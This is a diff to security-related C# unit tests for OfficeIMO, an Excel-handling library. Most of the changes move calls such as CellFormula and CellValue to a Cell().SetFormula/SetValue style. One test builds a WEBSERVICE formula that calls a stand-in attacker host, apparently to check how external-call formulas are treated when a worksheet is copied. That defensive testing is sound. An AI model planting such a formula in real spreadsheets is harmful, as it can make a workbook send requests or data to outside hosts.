@@ -16,7 +16,7 @@ namespace OfficeIMO.Tests {
             string targetPath = Path.Combine(_directoryWithFiles, "SecurityBatch08.FormulaTarget.xlsx");
 
             using (var source = ExcelDocument.Create(sourcePath)) {
-                source.AddSheet("Source").CellFormula(1, 1, "WEBSERVICE(\"https://attacker.invalid/\")");
+                source.AddSheet("Source").Cell(1, 1).SetFormula("WEBSERVICE(\"https://attacker.invalid/\")");
                 source.Save();
             }
 
@@ -50,10 +50,10 @@ namespace OfficeIMO.Tests {
 
             using (var source = ExcelDocument.Create(sourcePath)) {
                 ExcelSheet sheet = source.AddSheet("Source");
-                sheet.CellValue(1, 1, "Name");
-                sheet.CellValue(1, 2, "Result");
-                sheet.CellValue(2, 1, "Ada");
-                sheet.CellValue(2, 2, 7);
+                sheet.Cell(1, 1).SetValue("Name");
+                sheet.Cell(1, 2).SetValue("Result");
+                sheet.Cell(2, 1).SetValue("Ada");
+                sheet.Cell(2, 2).SetValue(7);
                 sheet.AddTable("A1:B2", hasHeader: true, name: "CalculatedResults", OfficeIMO.Excel.ExcelTableStyle.TableStyleMedium2);
                 source.Save();
             }
@@ -83,7 +83,7 @@ namespace OfficeIMO.Tests {
             string targetPath = Path.Combine(_directoryWithFiles, "SecurityBatch08.ExternalTarget.xlsx");
 
             using (var source = ExcelDocument.Create(sourcePath)) {
-                source.AddSheet("External").CellFormula(1, 1, "[1]Sheet1!A1");
+                source.AddSheet("External").Cell(1, 1).SetFormula("[1]Sheet1!A1");
                 source.Save();
             }
 
@@ -104,7 +104,7 @@ namespace OfficeIMO.Tests {
             string targetPath = Path.Combine(_directoryWithFiles, "SecurityBatch08.NamesTarget.xlsx");
 
             using (var source = ExcelDocument.Create(sourcePath)) {
-                source.AddSheet("Names").CellFormula(1, 1, "NameOne");
+                source.AddSheet("Names").Cell(1, 1).SetFormula("NameOne");
                 source.Save();
             }
 
@@ -130,8 +130,8 @@ namespace OfficeIMO.Tests {
             string targetPath = Path.Combine(_directoryWithFiles, "SecurityBatch08.MergeNamesTarget.xlsx");
 
             using (var source = ExcelDocument.Create(sourcePath)) {
-                source.AddSheet("First").CellFormula(1, 1, "FirstName");
-                source.AddSheet("Second").CellFormula(1, 1, "ThirdName");
+                source.AddSheet("First").Cell(1, 1).SetFormula("FirstName");
+                source.AddSheet("Second").Cell(1, 1).SetFormula("ThirdName");
                 source.Save();
             }
 
@@ -158,8 +158,8 @@ namespace OfficeIMO.Tests {
             string targetPath = Path.Combine(_directoryWithFiles, "SecurityBatch08.LocalNamesTarget.xlsx");
 
             using (var source = ExcelDocument.Create(sourcePath)) {
-                source.AddSheet("First").CellFormula(1, 1, "Rate");
-                source.AddSheet("Second").CellValue(1, 1, 2);
+                source.AddSheet("First").Cell(1, 1).SetFormula("Rate");
+                source.AddSheet("Second").Cell(1, 1).SetValue(2);
                 source.Save();
             }
 
@@ -183,8 +183,8 @@ namespace OfficeIMO.Tests {
             string targetPath = Path.Combine(_directoryWithFiles, "SecurityBatch08.QualifiedLocalNameTarget.xlsx");
 
             using (var source = ExcelDocument.Create(sourcePath)) {
-                source.AddSheet("First").CellFormula(1, 1, "Second!Rate");
-                source.AddSheet("Second").CellValue(1, 1, 2);
+                source.AddSheet("First").Cell(1, 1).SetFormula("Second!Rate");
+                source.AddSheet("Second").Cell(1, 1).SetValue(2);
                 source.Save();
             }
 
@@ -215,8 +215,8 @@ namespace OfficeIMO.Tests {
 
             using (var source = ExcelDocument.Create(sourcePath)) {
                 ExcelSheet sheet = source.AddSheet("Rows");
-                sheet.CellValue(1, 1, "safe");
-                sheet.CellBold(1, 1, true);
+                sheet.Cell(1, 1).SetValue("safe");
+                sheet.Cell(1, 1).SetBold(true);
                 source.Save();
             }
 
@@ -247,8 +247,8 @@ namespace OfficeIMO.Tests {
                 CopyMode = ExcelWorksheetCopyMode.Package
             });
             Assert.Equal("Imported", copied.Name);
-            Assert.Equal("safe", copied.CellAt(1, 1).GetValue<string>());
-            Assert.True(copied.CellAt(1, 1).GetStyle().Bold);
+            Assert.Equal("safe", copied.Cell(1, 1).GetValue<string>());
+            Assert.True(copied.Cell(1, 1).GetStyle().Bold);
         }
 
         [Fact]
@@ -256,7 +256,7 @@ namespace OfficeIMO.Tests {
             using var stream = new MemoryStream();
             using ExcelDocument document = ExcelDocument.Create(stream);
             ExcelSheet sheet = document.AddSheet("Rules");
-            sheet.CellValue(1, 1, DateTime.Today);
+            sheet.Cell(1, 1).SetValue(DateTime.Today);
             sheet.AddConditionalTimePeriodRule("A1", ExcelConditionalTimePeriod.Today, fillColor: "C6EFCE");
 
             ConditionalFormattingRule rule = sheet.WorksheetPart.Worksheet
@@ -275,7 +275,7 @@ namespace OfficeIMO.Tests {
             ExcelSheet sheet = document.AddSheet("Pages");
             for (int row = 1; row <= 4; row++) {
                 for (int column = 1; column <= 4; column++) {
-                    sheet.CellValue(row, column, row * column);
+                    sheet.Cell(row, column).SetValue(row * column);
                 }
             }
 
@@ -295,7 +295,7 @@ namespace OfficeIMO.Tests {
             using var stream = new MemoryStream();
             using ExcelDocument document = ExcelDocument.Create(stream);
             ExcelSheet sheet = document.AddSheet("Pages");
-            sheet.CellValue(1, 1, "safe");
+            sheet.Cell(1, 1).SetValue("safe");
             var rowBreaks = new RowBreaks();
             for (uint index = 0; index < 65U; index++) {
                 rowBreaks.Append(new Break {
